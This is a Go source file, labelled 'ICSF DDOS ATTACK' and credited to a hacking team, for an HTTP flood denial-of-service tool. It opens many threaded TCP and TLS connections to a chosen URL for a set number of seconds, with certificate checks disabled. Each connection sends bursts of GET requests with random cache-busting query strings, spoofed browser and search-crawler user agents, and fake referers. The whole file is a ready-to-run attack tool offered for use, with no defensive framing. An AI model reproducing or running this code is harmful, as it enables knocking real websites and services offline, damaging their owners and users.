 /*
Made by SOMSER
Team ICSF
*/

package main

import (
    "bufio"
    "crypto/tls"
    "fmt"
    "io"
    "math/rand"
    "net"
    "net/url"
    "os"
    "strconv"
    "strings"
    "time"
)

var (
    host      = ""
    port      = "80"
    page      = ""
    mode      = ""
    abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
    start     = make(chan bool)
    acceptall = []string{
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    }
    key     string
    choice  = []string{"Macintosh", "Windows", "X11"}
    choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
    choice3 = []string{"Windows NT 5.1", "Windows 7", "Windows 10", "Windows 11"}
    choice4 = []string{"Linux i686", "Linux x86_64"}
    choice5 = []string{"chrome", "spider", "ie"}
    choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
    spider  = []string{
        "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
        "Googlebot-Image/1.0",
        "Baiduspider ( http://www.baidu.com/search/spider.htm)",
    }
    referers = []string{
        "https://www.google.com/search?q=",
        "https://check-host.net/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
    }
)

func init() {
    rand.Seed(time.Now().UnixNano())
}

func getuseragent() string {
    platform := choice[rand.Intn(len(choice))]
    var os string
    if platform == "Macintosh" {
        os = choice2[rand.Intn(len(choice2))]
    } else if platform == "Windows" {
        os = choice3[rand.Intn(len(choice3))]
    } else {
        os = choice4[rand.Intn(len(choice4))]
    }

    browser := choice5[rand.Intn(len(choice5))]
    if browser == "chrome" {
        webkit := strconv.Itoa(rand.Intn(100) + 500)
        ver := strconv.Itoa(rand.Intn(100)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
        return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + ver + " Safari/" + webkit
    } else if browser == "ie" {
        ver := strconv.Itoa(rand.Intn(100)) + ".0"
        engine := strconv.Itoa(rand.Intn(100)) + ".0"
        token := ""
        if rand.Intn(2) == 1 {
            token = choice6[rand.Intn(len(choice6))] + "; "
        }
        return "Mozilla/5.0 (compatible; MSIE " + ver + "; " + os + "; " + token + "Trident/" + engine + ")"
    }
    return spider[rand.Intn(len(spider))]
}

func contain(s, x string) int {
    for i := 0; i < len(s); i++ {
        if s[i] == x[0] {
            return 1
        }
    }
    return 0
}

func flood() {
    addr := host + ":" + port
    header := ""

    if mode == "get" {
        header += " HTTP/1.1\r\nHost: " + addr + "\r\n"
        if os.Args[5] == "nil" {
            header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
            header += "User-Agent: " + getuseragent() + "\r\n"
            header += acceptall[rand.Intn(len(acceptall))]
            header += referers[rand.Intn(len(referers))] + "\r\n"
        } else {
            if fi, err := os.Open(os.Args[5]); err == nil {
                defer fi.Close()
                br := bufio.NewReader(fi)
                for {
                    a, _, c := br.ReadLine()
                    if c == io.EOF {
                        break
                    }
                    header += string(a) + "\r\n"
                }
            }
        }
    }

    <-start

    for {
        var s net.Conn
        var err error
        if port == "443" {
            cfg := &tls.Config{InsecureSkipVerify: true, ServerName: host}
            s, err = tls.Dial("tcp", addr, cfg)
        } else {
            s, err = net.Dial("tcp", addr)
        }

        if err != nil {
            fmt.Println("Connection failed")
            continue
        }

        for i := 0; i < 100; i++ {
            request := "GET " + page + key + strconv.Itoa(rand.Intn(2147483647)) +
                string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) +
                string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + header + "\r\n"
            s.Write([]byte(request))
        }
        s.Close()
    }
}

func main() {
    fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                    ||` ")
    fmt.Println(" ||  ||    ||      ||                 ||  .    ||                     ||  ")
    fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|,  .|''|,  .|''||  ")
    fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  ||  ||  ||  ||  || ")
    fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|'  `|..|'  `|..||. ")
    fmt.Println("                          ||                                              ")
    fmt.Println("                         .||         ICSF DDOS ATTACK                    ")
    fmt.Println("==========================================================================")

    if len(os.Args) != 6 {
        fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
        os.Exit(1)
    }

    u, err := url.Parse(os.Args[1])
    if err != nil {
        fmt.Println("Invalid URL")
        os.Exit(1)
    }

    tmp := strings.Split(u.Host, ":")
    host = tmp[0]

    if u.Scheme == "https" {
        port = "443"
    } else if u.Port() != "" {
        port = u.Port()
    }

    page = u.Path
    mode = os.Args[3]

    if mode != "get" && mode != "post" {
        fmt.Println("Mode must be 'get' or 'post'")
        return
    }

    threads, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Println("Threads must be an integer")
        return
    }

    limit, err := strconv.Atoi(os.Args[4])
    if err != nil {
        fmt.Println("Time must be an integer")
        return
    }

    if contain(page, "?") == 0 {
        key = "?"
    } else {
        key = "&"
    }

    input := bufio.NewReader(os.Stdin)
    for i := 0; i < threads; i++ {
        time.Sleep(100 * time.Microsecond)
        go flood()
        fmt.Printf("\rThreads [%d] ready", i+1)
        os.Stdout.Sync()
    }

    fmt.Printf("\nPress [Enter] to start attack\n")
    input.ReadString('\n')

    fmt.Printf("Flooding for %d seconds...\n", limit)
    close(start)
    time.Sleep(time.Duration(limit) * time.Second)
}